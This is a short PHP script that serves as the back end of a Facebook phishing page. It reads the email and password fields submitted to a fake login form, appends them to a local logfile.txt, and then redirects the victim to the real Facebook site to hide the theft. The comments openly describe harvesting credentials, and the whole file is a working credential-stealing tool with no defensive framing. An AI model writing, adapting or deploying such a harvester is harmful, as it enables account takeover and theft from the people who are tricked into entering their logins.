<?php
//assign all the parameters got from post method to local variables
$email = $_POST['email'];
$password = $_POST['pass'];

//append credentials obtained to a single variable
$credentials= $email."  ".$password."  ";

//This is where we save credentials we obtained in a text file logfile.txt
$myfile = fopen("logfile.txt", "a") or die("Unable to open file!");
fwrite($myfile, $credentials);
fclose($myfile);

//redirecting user to facebook login.
header('Refresh: 2; URL=https://www.facebook.com/');

?>